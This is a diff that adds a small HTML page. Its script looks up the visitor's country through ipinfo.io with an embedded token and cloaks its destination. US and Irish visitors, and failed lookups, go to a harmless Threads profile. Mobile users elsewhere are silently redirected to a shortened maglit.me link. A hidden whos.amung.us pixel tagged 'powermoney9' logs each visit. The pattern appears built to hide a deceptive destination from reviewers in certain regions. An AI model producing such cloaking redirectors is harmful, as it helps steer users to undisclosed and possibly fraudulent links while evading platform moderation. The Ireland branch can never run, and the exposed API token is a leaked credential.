@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Parker1504</title>
+    <script>
+        function redirectToDifferentWebsite() {
+            var isMobile = /iphone|ipod|android|blackberry|opera mini|windows phone|iemobile|mobile/i.test(navigator.userAgent.toLowerCase());
+            var mobileDevice = "https://maglit.me/25rd";
+            var pcURL = "https://www.threads.net/@zuck"; 
+            var mobileURL = mobileDevice;
+            var irelandURL = "https://youtu.be/QO6MlOCQwF4"; 
+            var blockedCountries = ['US', 'IE'];
+            
+           
+            fetch('https://ipinfo.io?token=74eaddd4400f3a')
+                .then(response => response.json())
+                .then(data => {
+                    var country = data.country;
+                    if (blockedCountries.includes(country)) {
+                        
+                        window.location.href = pcURL; 
+                    } else if (isMobile) {
+                        window.location.href = mobileURL;
+                    } else {
+                        if (country === 'IE') {
+                            window.location.href = irelandURL;
+                        } else {
+                            window.location.href = pcURL;
+                        }
+                    }
+                })
+                .catch(error => {
+                    console.error('Error fetching IP info:', error);
+                   
+                    window.location.href = pcURL;
+                });
+        }
+    
+        redirectToDifferentWebsite();
+    </script>    
+</head>
+<body>
+    <img src="//whos.amung.us/pingjs/?k=powermoney9&t= GHOST &x=Youtube.com" style="display:none" alt="">
+</body>
+</html>
